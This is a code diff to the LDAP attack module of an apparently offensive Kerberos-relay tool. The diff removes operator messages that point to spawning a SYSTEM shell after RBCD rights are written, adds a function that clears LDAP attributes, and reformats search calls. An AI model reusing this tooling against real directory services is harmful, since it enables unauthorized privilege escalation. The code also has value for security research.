@@ -64,24 +64,6 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
 
             //int rest = ldap_modify_ext(ld, dn, ptr, IntPtr.Zero, IntPtr.Zero, out int pMessage);
             int rest = ldap_modify_s(ld, dn, ptr);
-            if ((LdapStatus)rest == LdapStatus.LDAP_SUCCESS)
-            {
-                Console.WriteLine("[+] RBCD rights added successfully");
-                Console.WriteLine("[+] Run the spawn method for SYSTEM shell:");
-                Console.Write($"    ./KrbRelayUp spawn -d {Program.domain} -cn {Program.computerName}$ ");
-                if (!String.IsNullOrEmpty(Program.computerPassword))
-                {
-                    Console.WriteLine($"-cp {Program.computerPassword}");
-                }
-                else if (!String.IsNullOrEmpty(Program.computerPassword))
-                {
-                    Console.WriteLine($"-cp {Program.computerPasswordHash}");
-                }
-                else
-                {
-                    Console.WriteLine("[-cp PASSWORD | -ch NTHASH]");
-                }
-            }
 
             mod.ForEach(_ =>
             {
@@ -91,6 +73,41 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
             });
             Marshal.FreeHGlobal(ptr);
             
+            return (LdapStatus)rest;
+        }
+
+        public static LdapStatus clearAttribute(IntPtr ld, string attribute, string dn)
+        {
+            var modPropPtr = Marshal.StringToHGlobalUni(attribute);
+            var modValue = new List<byte[]> {};
+            var modValuePtr = Marshal.AllocHGlobal(IntPtr.Size * 2);
+            Helpers.ByteArraysToBerValueArray(modValue.Select(_ => _ ?? Array.Empty<byte>()).ToArray(), modValuePtr);
+            List<LDAPMod> mod = new List<LDAPMod> {
+                new LDAPMod {
+                    mod_op = (int)LdapModOperation.LDAP_MOD_REPLACE | (int)LdapModOperation.LDAP_MOD_BVALUES,
+                    mod_type = modPropPtr,
+                    mod_vals_u = new LDAPMod.mod_vals
+                    {
+                        modv_bvals = modValuePtr
+                    },
+                    mod_next = IntPtr.Zero
+                }
+            };
+            var ptr = Marshal.AllocHGlobal(IntPtr.Size * 2); // alloc memory for list with last element null
+            Helpers.StructureArrayToPtr(mod, ptr, true);
+
+            //int rest = ldap_modify_ext(ld, dn, ptr, IntPtr.Zero, IntPtr.Zero, out int pMessage);
+            int rest = ldap_modify_s(ld, dn, ptr);
+            Console.WriteLine("[*] ldap_clear: {0}", (LdapStatus)rest);
+
+            mod.ForEach(_ =>
+            {
+                Helpers.BerValuesFree(_.mod_vals_u.modv_bvals);
+                Marshal.FreeHGlobal(_.mod_vals_u.modv_bvals);
+                Marshal.FreeHGlobal(_.mod_type);
+            });
+            Marshal.FreeHGlobal(ptr);
+
             return (LdapStatus)rest;
         }
 
@@ -148,13 +165,7 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
             IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
             var controlPtr = Marshal.StringToHGlobalUni("DistinguishedName");
             Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
-            var search = ldap_search(
-                ld,
-                $"{Relay.domainDN}",
-                (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
-                $"(&(objectClass=computer)(sAMAccountName={computername}))",
-                pLaps,
-                0);
+            var search = ldap_search(ld, $"{Options.domainDN}", (int)LdapSearchScope.LDAP_SCOPE_SUBTREE, $"(&(objectClass=computer)(sAMAccountName={computername}))", pLaps, 0);
             //Console.WriteLine("[*] msgID: {0}", search);
 
             IntPtr pMessage = IntPtr.Zero;
@@ -201,13 +212,7 @@ namespace KrbRelayUp.Relay.Attacks.Ldap
             IntPtr pLaps = Helpers.AllocHGlobalIntPtrArray(1 + 1);
             var controlPtr = Marshal.StringToHGlobalUni(property);
             Marshal.WriteIntPtr(pLaps, IntPtr.Size * 0, controlPtr);
-            var search = ldap_search(
-                ld,
-                $"{Relay.domainDN}",
-                (int)LdapSearchScope.LDAP_SCOPE_SUBTREE,
-                $"(&(objectClass=*)(sAMAccountName={adObject}))",
-                pLaps,
-                0);
+            var search = ldap_search(ld, $"{Options.domainDN}", (int)LdapSearchScope.LDAP_SCOPE_SUBTREE, $"(&(objectClass=*)(sAMAccountName={adObject}))", pLaps, 0);
             //Console.WriteLine("[*] msgID: {0}", search);
 
             IntPtr pMessage = IntPtr.Zero;
